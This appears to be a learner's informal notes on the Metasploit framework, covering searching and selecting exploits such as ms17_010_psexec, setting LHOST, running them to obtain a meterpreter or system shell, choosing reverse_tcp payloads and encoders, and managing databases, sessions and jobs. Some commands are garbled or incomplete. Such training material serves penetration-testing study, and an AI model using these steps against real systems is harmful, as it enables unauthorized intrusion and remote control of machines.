Metasploit:Exploits module

To use metaspoite we can manually start it or we can write “msfconsole” in the terminal.
->usually metasploit directory will be found in /usr/share/metasploit-framework

-> Linux command can be use in msf terminal
->we can use help to get manual of metasploit in msf terminal
->we can search by using “search” keyword following search term
　　example: search  exploits
　　which will be used to find all the exploits in metasploit


#1.How to find specific exploits for specific  vulnernabllity?

->we can use nmap to enumeratation of the target such as os,services,ports etc.

then we can use the following command in msf terminal.

->”search type:exploit platform:windows name:eternalromance”

where exploits is the module name(metasploit has 7 modules like exploit,auxiliary,encoders,evasion,post,payload,nops etc),eternalromance is the exploit name.

2.How to use specific  exploits in metasploit?


->we can use “use” key word to use a specific exploits following by the exploits name or directory or number of the exploits.

example:use 4136

->we can check which options are required to run that exploits by using “options” key word after the exploit number is set or when we in exploit directory.

example :msf6 exploit(windows/smb/ms17_010_psexec) > show 

->we need to set options which is required yes.

->we can use “set” key word to set the required options following by options_name and options value.

example: msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.10.14

->after setting the all required value we can run the exploits using “run” command.

example:msf6 exploit(windows/smb/ms17_010_psexec) > run

-> After finding the meterpreter shell we can get into system shell by using "shell" command
**example**: meterpreter> shell
**-> we can see module information by using "info" command" **
**example:msf6 exploit(windows/smb/ms17_010_psexec) > info**

MSF-targets:

--> we can see the targets by using "show targets" but before that we have to select module.
example:msf6 exploit(windows/smb/ms17_010_psexec) > show targets
[we have to see the module info by using "info" command after selecting the module.This module info is very important for selecting targets especially Description]

MSF-Payloads:

we can select payloads ,if we don't want to use  the default payloads.After selecting exploit module, we can select payloads or without selecting exploit we also can select payloads.
To see all payloads we can use-->"show payloads" 
We can grep to easily identify desired payloads--> "grep meterpreter grep reverse_tcp show payloads"

MSF-Encoder:

we can make our payloads more complex using encodor.To use encoder we have to select first  exploit module and payloads.Then we use "show encoder" command to see which encode are available for that
payloads.
example:"msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders"
we can use encoder with msfvenom which we will see following text.

MSF-Database:

To use database we first need to ensure that the postgreSQL  server is up.
we can check server status by using -> "sudo service postgresql status"  if it is inactive or dead.We can use this command to start the server ->"sudo systemctl start postgresql" 
we can initiate the database ->" sudo msfdb init"
To connect database we can use->"sudo msfdb run"
Database options->"help database"
Workspace is similar like a folder in project.we can create database workspace by using -> "workspace -a Target_1" where "a" means add and "Target_1" is the created workspace.
we can also delete workspace by -> "workspace -d Target_1" this.

we can see help options by ->help database
we can see workspace help by -> workspace -h


Sessions:

It is used to manage multiple sessions at the same time.
we can see currently  active sessions by using "session" command.
example:"msf6 exploit(windows/smb/psexec_psh) > sessions"
we can run a session in background by using:"ctrl+z"
interacting with sessions: we can use ->" sessions -i [no.]" to open specific sessions


Jobs:

job is similar like sessions;where we can lists currently running jobs.Usually we use it to see which port is using right now.
we can open jobs help menu by ->"jobs -h"
example:"msf6 exploit(multi/handler) > jobs -h"
Listing Running Jobs:"msf6 exploit(multi/handler) > jobs -l"


